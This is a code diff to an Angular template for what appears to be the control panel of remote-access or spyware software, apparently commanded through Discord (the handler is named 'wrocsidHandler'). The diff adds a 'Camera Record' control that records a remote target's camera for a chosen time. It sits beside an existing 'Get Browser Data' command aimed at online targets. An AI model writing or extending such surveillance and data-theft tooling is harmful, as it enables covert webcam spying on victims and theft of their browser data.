@@ -77,6 +77,23 @@
       </select>
     </mat-form-field>
   </form>
+  <form [formGroup]="cameraRecordForm">
+    <button mat-button [disabled]="!target$.online || !cameraRecordForm.valid" color="accent"
+      (click)="wrocsidHandler('cameraRecord', target$.identifier, concatTime(cameraRecordForm))">Camera Record</button>
+    <mat-form-field appearance="fill" class="timeInput">
+      <mat-label>Time amount</mat-label>
+      <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+      <mat-error *ngIf="cameraRecordForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+    </mat-form-field>
+    <mat-form-field appearance="fill" class="timeInput">
+      <mat-label>Time units</mat-label>
+      <select matNativeControl required [attr.disabled]="!target$.online" #timeUnits formControlName="timeUnits">
+        <option value="s">Seconds</option>
+        <option value="m">Minutes</option>
+        <option value="h">Hours</option>
+      </select>
+    </mat-form-field>
+  </form>
   <div>
     <button mat-button [disabled]="!target$.online" color="accent"
       (click)="wrocsidHandler('getBrowserData', target$.identifier)">Get Browser Data</button>
